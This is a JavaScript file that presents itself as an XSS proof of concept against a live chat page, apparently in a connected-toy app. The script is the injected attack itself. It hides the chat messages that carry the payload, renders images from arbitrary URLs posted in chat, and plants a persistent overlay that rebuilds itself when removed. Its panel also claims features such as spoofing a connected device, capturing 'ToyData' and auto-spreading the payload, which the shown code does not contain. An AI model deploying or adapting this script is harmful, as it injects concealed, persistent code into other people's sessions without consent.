if (!window.__chatCouponCleanerLoaded) {
    window.__chatCouponCleanerLoaded = true;

    const style = document.createElement('style');
    style.textContent = `

    li:has(*[class*="XSS"])  {
      display: none !important;
      visibility: hidden !important;
      opacity: 0 !important;
      height: 0px !important;
      max-height: 0px !important;
      overflow: hidden !important;
      position: absolute !important;
      left: -9999px !important;
      pointer-events: none !important;
    }
    li:has(*[class*="tips-disable"]) {
      display: none !important;
      visibility: hidden !important;
      opacity: 0 !important;
      height: 0px !important;
      max-height: 0px !important;
      overflow: hidden !important;
      position: absolute !important;
      left: -9999px !important;
      pointer-events: none !important;
    }
    
    .toy-name span {
      display: none !important;
      visibility: hidden !important;
      opacity: 0 !important;
    }`;
    document.head.appendChild(style);


    const chatListUl = document.getElementById('lvs-chat-list').children[0];

    if (chatListUl) {
        const observer = new MutationObserver((mutationsList) => {
            for (const mutation of mutationsList) {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === Node.ELEMENT_NODE && node.tagName === 'LI') {
                            processLi(node);
                        }
                    });
                }

                if (mutation.type === 'subtree' || mutation.type === 'characterData') {
                    const targetLi = mutation.target.closest('li');
                    if (targetLi) {
                        processLi(targetLi);
                    }
                }
            }
        });

        function processLi(li) {
            const p = li.getElementsByClassName("chat-text")[0];
            if (!p) return;
            const text = p.innerText.trim();
            if (text.startsWith("IMG!")) {
                const imgUrl = text.substring(4);
                const alreadyHasImg = p.previousElementSibling?.tagName === 'IMG' &&
                    p.previousElementSibling.src === imgUrl;

                if (!alreadyHasImg) {
                    const img = document.createElement('img');
                    img.src = imgUrl;
                    img.alt = 'Image';
                    img.classList.add("chat-text")
                    img.style["max-width"] = '-webkit-fill-available';
                    p.style.display = 'none';
                    p.parentNode.insertBefore(img, p);
                }
            }
        }

        observer.observe(chatListUl, {
            childList: true,
            subtree: true,
            characterData: true
        });
    }

    const BUTTON_ID = 'persistent-float-button';
    const IFRAME_ID = 'persistent-iframe';

    let isOverlayOpen = false;
    let iframe = null;

    function createFloatingButton() {
        const button = document.createElement('div');
        button.id = BUTTON_ID;
        button.innerHTML = '👨‍💻';
        button.style.cssText = `
                position: fixed !important;
                top: 20px !important;
                right: 20px !important;
                width: 32px !important;
                height: 32px !important;
                background: #333 !important;
                color: white !important;
                border: 1px solid white !important;
                border-radius: 50% !important;
                cursor: pointer !important;
                z-index: 2147483647 !important;
                display: flex !important;
                align-items: center !important;
                justify-content: center !important;
                font-size: 8px !important;
                line-height: 1 !important;
                box-shadow: 0 2px 6px rgba(0,0,0,0.5) !important;
                transition: all 0.3s ease !important;
                user-select: none !important;
                font-family: Arial, sans-serif !important;
                padding: 0 !important;
                margin: 0 !important;
                box-sizing: border-box !important;
            `;

        button.addEventListener('click', toggleOverlay);
        button.addEventListener('mouseenter', function() {
            this.style.transform = 'scale(1.1)';
            this.style.backgroundColor = '#555';
        });
        button.addEventListener('mouseleave', function() {
            this.style.transform = 'scale(1)';
            this.style.backgroundColor = '#333';
        });

        return button;
    }

    function createIframe() {
        const iframe = document.createElement('iframe');
        iframe.id = IFRAME_ID;
        iframe.style.cssText = `
                position: fixed !important;
                top: 0 !important;
                left: 0 !important;
                width: 100vw !important;
                height: 100vh !important;
                border: none !important;
                z-index: 2147483646 !important;
                display: none !important;
                background: transparent !important;
            `;

        const iframeContent = `
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
    
            body {
                font-family: Arial, sans-serif;
                background: rgba(0, 0, 0, 0.9);
                backdrop-filter: blur(5px);
                -webkit-backdrop-filter: blur(5px);
                width: 100vw;
                height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                overflow: hidden;
                position: relative;
            }
    
            .panel {
                background: #1a1a1a;
                border: 1px solid #333;
                border-radius: 12px;
                width: 80%;
                height: 80%;
                box-shadow: 0 8px 32px rgba(0,0,0,0.8);
                display: flex;
                flex-direction: column;
                overflow: hidden;
            }
    
            .header {
                padding: 20px 30px;
                border-bottom: 1px solid #333;
                display: flex;
                justify-content: space-between;
                align-items: center;
                flex-shrink: 0;
            }
    
            .title {
                color: #ffffff;
                font-size: 20px;
                margin: 0;
            }
    
            .close-btn {
                background: none;
                border: none;
                font-size: 24px;
                cursor: pointer;
                color: #ccc;
                width: 30px;
                height: 30px;
                display: flex;
                align-items: center;
                justify-content: center;
                border-radius: 50%;
                transition: all 0.2s ease;
            }
    
            .close-btn:hover {
                background-color: #333;
                color: #fff;
            }
    
            .content {
                flex: 1;
                overflow-y: auto;
                padding: 30px;
                color: #ccc;
            }
    
            .content h3 {
                color: #fff;
                margin-bottom: 15px;
            }
    
            .content p {
                margin-bottom: 10px;
                line-height: 1.6;
            }
    
            .content ul {
                margin-left: 20px;
                margin-bottom: 15px;
            }
    
            .content li {
                margin-bottom: 5px;
            }
    
            .content::-webkit-scrollbar {
                width: 8px;
            }
    
            .content::-webkit-scrollbar-track {
                background: #1a1a1a;
            }
    
            .content::-webkit-scrollbar-thumb {
                background: #444;
                border-radius: 4px;
            }
    
            .content::-webkit-scrollbar-thumb:hover {
                background: #555;
            }
        </style>
    </head>
    <body>
        <div class="panel">
            <div class="header">
                <h2 class="title">XSS POC By VT-0xFF</h2>
                <button class="close-btn" onclick="parent.postMessage('close', '*')">&times;</button>
            </div>
            <div class="content">
                <h3>Welcome!</h3>
                <p>This is my XSS (Cross Site Scripting) Attack POC!</p>
                
                <h3>Features:</h3>
                <ul>
                    <li>Hiding the payload</li>
                    <li>Adding cool features (Images in chat)</li>
                    <li>Hardly impacting performance</li>
                    <li>Cool Menu (This One)</li>
                    <li>Feign a device being connected</li>
                    <li>Forward any ToyData to a file for further processing</li>
                    <li>Automatically sending payload</li>
                    <li>Automatically closing on non-vulnerable POIs (The remote app on IOS/Android)</li>
                </ul>
                
                <p>The panel will automatically recreate itself if removed from the DOM, ensuring it stays persistent on the page.</p>
            </div>
        </div>
    
        <script>
            document.body.addEventListener('click', function(e) {
                if (e.target === document.body) {
                    parent.postMessage('close', '*');
                }
            });
        </script>
    </body>
    </html>`;

        iframe.onload = function() {
            const doc = iframe.contentDocument || iframe.contentWindow.document;
            doc.open();
            doc.write(iframeContent);
            doc.close();
        };

        return iframe;
    }

    function toggleOverlay() {
        if (isOverlayOpen) {
            closeOverlay();
        } else {
            openOverlay();
        }
    }

    function openOverlay() {
        if (iframe) {
            iframe.style.display = 'block';
            isOverlayOpen = true;
        }
    }

    function closeOverlay() {
        if (iframe) {
            iframe.style.display = 'none';
            isOverlayOpen = false;
        }
    }

    window.addEventListener('message', function(event) {
        if (event.data === 'close') {
            closeOverlay();
        }
    });

    function initializeElements() {
        const existingButton = document.getElementById(BUTTON_ID);
        const existingIframe = document.getElementById(IFRAME_ID);

        if (existingButton) existingButton.remove();
        if (existingIframe) existingIframe.remove();

        const button = createFloatingButton();
        iframe = createIframe();

        document.body.appendChild(button);
        document.body.appendChild(iframe);

        iframe.src = 'about:blank';
    }

    function setupMutationObserver() {
        const observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                if (mutation.type === 'childList') {
                    mutation.removedNodes.forEach(function(node) {
                        if (node.id === BUTTON_ID || node.id === IFRAME_ID) {
                            setTimeout(initializeElements, 100);
                        }
                    });
                }
            });
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }

    function init() {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', function() {
                initializeElements();
                setupMutationObserver();
            });
        } else {
            initializeElements();
            setupMutationObserver();
        }
    }

    init();

    setInterval(function() {
        if (!document.getElementById(BUTTON_ID) || !document.getElementById(IFRAME_ID)) {
            initializeElements();
        }
    }, 5000);

}
